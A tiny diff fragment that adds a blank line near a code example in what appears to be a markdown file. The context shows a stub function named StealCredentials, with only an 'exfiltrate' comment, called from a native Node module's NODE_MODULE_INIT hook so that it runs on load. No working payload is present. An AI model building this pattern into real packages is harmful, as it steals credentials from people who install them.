@@ -209,6 +209,7 @@ void StealCredentials() {
   // ... exfiltrate ...
 }
 
+
 NODE_MODULE_INIT() { StealCredentials(); }
 ```
 
